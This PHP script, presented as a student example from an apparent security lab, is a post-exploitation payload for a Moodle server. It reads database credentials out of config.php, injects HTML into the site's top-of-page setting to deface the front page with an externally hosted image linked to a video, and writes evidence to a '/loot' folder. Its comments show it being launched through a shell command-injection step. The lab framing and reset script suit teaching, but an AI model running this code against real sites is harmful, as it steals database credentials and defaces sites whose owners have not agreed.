<?php
// Student example: put a clickable image on the Moodle front page.
//
// The image is good-hacker.webp. Clicking it opens the linked video in a new
// tab. This effect does not create a separate landing page and does not change
// the site name or the additionalhtmlhead redirect.
//
//   cp labs/examples/good-hacker.php loot/good-hacker.php
//   printf 'php /loot/good-hacker.php\n' > loot/c
//   ... -c 'sh</loot/c'
//
// Reset with reset-good-hacker.php, which restores the saved top-of-page HTML.

$src = @file_get_contents('/var/www/config/config.php');
if ($src === false) {
    fwrite(STDERR, "cannot read /var/www/config/config.php\n");
    exit(1);
}

$cfg = [];
foreach (['dbhost', 'dbname', 'dbuser', 'dbpass'] as $key) {
    if (preg_match('/\$CFG->' . $key . '\s*=\s*\'([^\']*)\'/', $src, $m)) {
        $cfg[$key] = $m[1];
    }
}

$imageUrl = 'https://s.xn--kst.tw/good-hacker.webp';
if (is_readable('/loot/image-url')) {
    $candidate = trim((string) file_get_contents('/loot/image-url'));
    if (preg_match('#^https://#', $candidate)) {
        $imageUrl = $candidate;
    }
}
$imageUrlSafe = htmlspecialchars($imageUrl, ENT_QUOTES, 'UTF-8');
$imageHtml = '<div style="text-align:center;margin:14px 0;">'
    . '<a href="https://www.youtube.com/watch?v=dQw4w9WgXcQ" target="_blank" rel="noopener">'
    . '<img src="' . $imageUrlSafe . '" alt="Good hacker" style="max-width:420px;width:100%;height:auto;border:0;border-radius:6px;">'
    . '</a></div>';

try {
    $pdo = new PDO(
        "mysql:host={$cfg['dbhost']};dbname={$cfg['dbname']};charset=utf8mb4",
        $cfg['dbuser'],
        $cfg['dbpass'],
        [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION]
    );

    $saved = $pdo->query("SELECT value FROM mdl_config WHERE name='lab_good_hacker_prev_top_saved'")->fetchColumn();
    if ($saved === false) {
        $prev = $pdo->query("SELECT value FROM mdl_config WHERE name='additionalhtmltopofbody'")->fetchColumn();
        $stmt = $pdo->prepare(
            "INSERT INTO mdl_config (name, value) VALUES (:n, :v)
             ON DUPLICATE KEY UPDATE value = VALUES(value)"
        );
        $stmt->execute([':n' => 'lab_good_hacker_prev_top', ':v' => $prev === false ? '' : (string) $prev]);
        $stmt->execute([':n' => 'lab_good_hacker_prev_top_saved', ':v' => '1']);
    }

    $top = $pdo->query("SELECT value FROM mdl_config WHERE name='additionalhtmltopofbody'")->fetchColumn();
    $top = $top === false ? '' : (string) $top;
    if (strpos($top, 'good-hacker.webp') !== false && strpos($top, $imageUrl) === false) {
        throw new RuntimeException('legacy local good-hacker image found; reset the old effect first');
    }
    if (strpos($top, $imageUrl) === false) {
        $top .= "\n" . $imageHtml;
    }
    $stmt = $pdo->prepare(
        "INSERT INTO mdl_config (name, value) VALUES ('additionalhtmltopofbody', :v)
         ON DUPLICATE KEY UPDATE value = VALUES(value)"
    );
    $stmt->execute([':v' => $top]);
    passthru('php -d memory_limit=256M /var/www/html/admin/cli/purge_caches.php >/dev/null 2>&1');

    $check = $pdo->query("SELECT value FROM mdl_config WHERE name='additionalhtmltopofbody'")->fetchColumn();
    if (!is_string($check)
        || strpos($check, $imageUrl) === false
        || strpos($check, 'youtube.com/watch?v=dQw4w9WgXcQ') === false) {
        throw new RuntimeException('front-page image or link read-back failed');
    }

    $evidence = "good-hacker=ok image={$imageUrl} link=youtube db=verified\n";
    file_put_contents('/loot/p1', $evidence);
    echo $evidence;
} catch (Throwable $e) {
    fwrite(STDERR, 'good-hacker=failed reason=' . preg_replace('/\s+/', ' ', $e->getMessage()) . "\n");
    exit(1);
}
